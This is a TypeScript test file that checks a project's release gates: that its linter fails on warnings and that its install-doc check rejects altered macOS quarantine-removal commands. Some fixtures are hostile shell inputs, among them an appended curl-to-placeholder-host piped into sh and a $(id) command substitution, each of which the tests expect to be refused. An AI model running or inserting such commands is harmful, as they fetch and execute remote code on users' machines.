// Whether the release gates can say no. Each test is a defect found: `npm run lint` exited 0 on
// oxlint warnings (a planted duplicate key passed), and verify-quarantine-advice.mjs misread fences
// below a ```powershell block. Asserted: each stops on a broken tree.
import { spawnSync } from 'node:child_process'
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'

const REPO_ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..')
const PACKAGE = JSON.parse(readFileSync(join(REPO_ROOT, 'package.json'), 'utf8')) as {
  scripts: Record<string, string>
}

let scratch = ''
beforeAll(() => {
  scratch = mkdtempSync(join(tmpdir(), 'teamree-gates-'))
})
afterAll(() => {
  rmSync(scratch, { recursive: true, force: true })
})

/** Writes `contents` to a file in the scratch directory and returns its path. */
function fixture(name: string, contents: string): string {
  const path = join(scratch, name)
  writeFileSync(path, contents)
  return path
}

// ------------------------------------------------------------- the linter --

describe('the lint gate', () => {
  // `no-dupe-keys` is a correctness rule under any configuration.
  const OFFENDING = 'export const wrong = { a: 1, a: 2 }\n'

  function oxlint(flags: string[], target: string) {
    return spawnSync('npx', ['oxlint', ...flags, target], { cwd: REPO_ROOT, encoding: 'utf8' })
  }

  // Without the flag oxlint prints the defect and exits 0.
  it('would pass a defect it has found and printed, if warnings were not denied', () => {
    const target = fixture('unflagged.ts', OFFENDING)
    const result = oxlint(['-c', '.oxlintrc.json'], target)
    expect(result.stdout + result.stderr).toContain('no-dupe-keys')
    expect(result.status).toBe(0)
  })

  it('refuses the same defect once they are', () => {
    const target = fixture('flagged.ts', OFFENDING)
    expect(oxlint(['-c', '.oxlintrc.json', '--deny-warnings'], target).status).not.toBe(0)
  })

  // Two rules are off in .oxlintrc.json; the rest must still bite.
  it('still has the rest of its rules after the two this project turns off', () => {
    const target = fixture('unreachable.ts', 'export function f() {\n  return 1\n  return 2\n}\n')
    const result = oxlint(['-c', '.oxlintrc.json', '--deny-warnings'], target)
    expect(result.stdout + result.stderr).toContain('no-unreachable')
    expect(result.status).not.toBe(0)
  })

  it('is run by the gate that way, and not the way that could not fail', () => {
    expect(PACKAGE.scripts.lint).toMatch(/--deny-warnings|--max-warnings[= ]0/)
  })
})

// ------------------------------------------------- the quarantine advice --

describe('the check on the one command every first user is given', () => {
  const SCRIPT = join(REPO_ROOT, 'scripts', 'verify-quarantine-advice.mjs')
  const RIGHT = 'xattr -dr com.apple.quarantine /Applications/teamree.app'

  /** Runs the check against a fixture, never the real `docs/install.md`. */
  function check(markdown: string) {
    const doc = fixture(`install-${Math.random().toString(36).slice(2, 8)}.md`, markdown)
    const result = spawnSync(process.execPath, [SCRIPT, doc], { cwd: REPO_ROOT, encoding: 'utf8' })
    return { status: result.status, output: `${result.stdout}${result.stderr}` }
  }

  const document = (...blocks: string[]) =>
    ['# Installing', '', 'Some prose.', '', ...blocks.flatMap((block) => ['```sh', block, '```', ''])].join('\n')

  it('reads the command the document actually gives', () => {
    const result = check(document(RIGHT))
    expect(result.output).toContain(`read the advice out of`)
    expect(result.output).toContain(RIGHT)
    // Not the exit status: on macOS the run continues into a real bundle.
    expect(result.output).toContain('the release notes print the same command')
  })

  it('refuses a document that has stopped giving one at all', () => {
    const result = check(document('open /Applications/teamree.app'))
    expect(result.status).toBe(1)
    expect(result.output).toContain('no longer gives a command for com.apple.quarantine')
  })

  it('refuses a command that disagrees with the one the release notes print', () => {
    const result = check(document('xattr -cr /Applications/teamree.app'))
    expect(result.status).toBe(1)
    expect(result.output).toContain('prints a different quarantine command')
  })

  it('refuses a command written against somewhere else, which it could not run verbatim', () => {
    const result = check(document('xattr -dr com.apple.quarantine ~/Downloads/teamree.app'))
    expect(result.status).toBe(1)
    expect(result.output).toContain('does not name /Applications/teamree.app')
  })

  it('refuses two spellings of the advice, which is how one of them rots unnoticed', () => {
    const result = check(document(RIGHT, 'xattr -cr /Applications/teamree.app'))
    expect(result.status).toBe(1)
    expect(result.output).toContain('2 different quarantine commands')
  })

  // This block is run through `/bin/sh` on the release machine. `agreesWithReleaseNotes` happens to
  // refuse it too, but the refusal asserted is the one that names the shell.
  it('refuses a block with a second command hung off the end of the advice', () => {
    const result = check(document(`${RIGHT} && curl -s http://example.invalid/x | sh`))
    expect(result.status).toBe(1)
    expect(result.output).toContain('not a single plain xattr invocation')
    expect(result.output).toContain('runs it through a shell')
  })

  it('refuses a block that is two lines, whatever the second one is', () => {
    const result = check(document(`${RIGHT}\necho hello`))
    expect(result.status).toBe(1)
    expect(result.output).toContain('not a single plain xattr invocation')
  })

  // Command substitution has no operator, which is why the check is a character set.
  it('refuses a block that substitutes a command into the path', () => {
    const result = check(document('xattr -dr com.apple.quarantine /Applications/teamree.app$(id)'))
    expect(result.status).toBe(1)
    expect(result.output).toContain('not a single plain xattr invocation')
  })

  it('refuses a block that runs something else before xattr', () => {
    const result = check(document(`sudo ${RIGHT}`))
    expect(result.status).toBe(1)
    expect(result.output).toContain('not a single plain xattr invocation')
  })

  // The regression: a ```powershell fence desynchronised the pairing, hiding this second command.
  it('sees a second spelling below a fence whose language it does not know', () => {
    const result = check(
      [
        '# Installing',
        '',
        '```sh',
        RIGHT,
        '```',
        '',
        'And on some other machine:',
        '',
        '```powershell',
        'Get-Item .',
        '```',
        '',
        'And then:',
        '',
        '```sh',
        'xattr -cr /Applications/teamree.app',
        '```',
        ''
      ].join('\n')
    )
    expect(result.status).toBe(1)
    expect(result.output).toContain('2 different quarantine commands')
  })
})
